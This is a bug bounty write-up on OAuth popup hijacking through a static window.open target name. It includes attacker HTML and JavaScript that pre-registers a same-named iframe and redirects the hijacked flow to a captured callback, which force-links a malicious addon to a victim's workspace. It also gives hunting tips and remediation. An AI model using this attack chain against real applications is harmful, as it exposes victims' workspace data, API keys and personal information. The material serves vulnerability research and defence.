Predicted window.open Target: OAuth Popup Hijacking for Forced Account Linking

Based on CTBB Lab research · Exploits predictable browsing context names

Vulnerability

An addon marketplace uses window.open(url, "addons-oauthWindow") with a static, predictable target name for the OAuth popup. Per the browser spec, window.open reuses any existing browsing context with that name. An attacker pre-registers an iframe with the same name, causing the OAuth flow to load inside the attacker's iframe instead of a new popup — enabling forced linking of a malicious addon to the victim's workspace.

How window.open Target Names Work

The second parameter of window.open(url, target) specifies a browsing context name. The browser searches for an existing context with that name before creating a new one:

// Application code - opens OAuth popup
var popup = window.open(
  oauthUrl,
  'addons-oauthWindow',  // Static name - PREDICTABLE!
  'menubar=no,toolbar=no,width=640,height=580'
);

// Browser behavior:
// 1. Search for existing context named "addons-oauthWindow"
// 2. If found → load URL in that existing context
// 3. If not found → open new popup window

// Attacker's page has already created:
// <iframe name="addons-oauthWindow" src="..."></iframe>
// So the OAuth URL loads in the attacker's iframe!

The Attack Chain

Step 1: CSP Bypass for Cross-Origin Iframe

The attacker needs their page to have an iframe under the target's origin (to match the browsing context). Static JS files served without frame-ancestors CSP allow this:

<!-- Attacker's page -->
<iframe
  id="hijackFrame"
  name="addons-oauthWindow"
  src="https://app.target.com/static/chunk.a1b2c3d4.js"
></iframe>
<!-- This iframe now owns the "addons-oauthWindow" browsing context -->

Step 2: Prepare the Malicious Addon Callback

The attacker installs their own malicious addon, intercepts the OAuth callback URL before it completes, and saves it:

// Attacker captured their own addon's OAuth callback:
var attackerCallback =
  "https://api.target.com/api/auth/callback" +
  "?code=ATTACKER_CODE&state=ATTACKER_STATE";

Step 3: Hijack the Victim's OAuth Flow

function startAttack() {
  // Open the target app so victim can trigger addon install
  window.open("https://app.target.com/workspace/addons");

  var frame = document.getElementById("hijackFrame");
  var hijacked = false;

  // When the OAuth flow loads in our iframe (instead of popup)
  frame.onload = function() {
    if (hijacked) return;
    hijacked = true;
    // Redirect to attacker's pre-captured callback
    // This links the ATTACKER's addon to the VICTIM's workspace
    frame.src = attackerCallback;
  };
}

The Full Chain

Bug 1: Static, predictable window.open target name ("addons-oauthWindow")

Bug 2: Static assets served without frame-ancestors CSP — allows cross-origin iframe

Bug 3: OAuth callback page sends postMessage to window.opener without verifying it's the expected popup

Result: Attacker's malicious addon is force-linked to victim's workspace, gaining access to workspace data, API keys, and member PII

Why It Matters

The attacker's addon now has full marketplace API access to the victim's workspace: member list with emails, workspace configuration, API keys, billing information. This is a one-click attack — the victim just needs to click "Connect" on any addon in their marketplace. The attacker's addon gets linked instead.

PostMessage Validation Bypass

The app validates that OAuth responses come from the expected popup:

// App's validation:
let popupRef = window.open(url, "addons-oauthWindow", ...);

window.addEventListener('message', function(e) {
  // Checks that message comes from expected origin AND source
  if (e.origin === expectedOrigin && e.source === popupRef) {
    processOAuthResponse(e.data);
  }
});

// Problem: popupRef is the hijacked iframe!
// e.source === popupRef is TRUE because the iframe IS the context
// that was returned by window.open

Bug Bounty Tip

Search JavaScript for window.open calls with a static second argument. If the target name is hardcoded (not randomized per session), the popup can be hijacked via iframe name collision. Key things to check: (1) Is the target name static? (2) Can you create an iframe with that name under the target's origin? (3) Does the OAuth callback use window.opener or postMessage? This pattern appears in addon marketplaces, SSO flows, and payment popups.

Remediation

  • Randomize the window.open target name per session: window.open(url, 'oauth_' + crypto.randomUUID())
  • Add frame-ancestors 'none' CSP to all pages, including static assets
  • Verify postMessage source is a popup (not an iframe) by checking event.source.window === event.source
  • Use a server-side nonce in the OAuth state parameter that's validated server-side, not just client-side
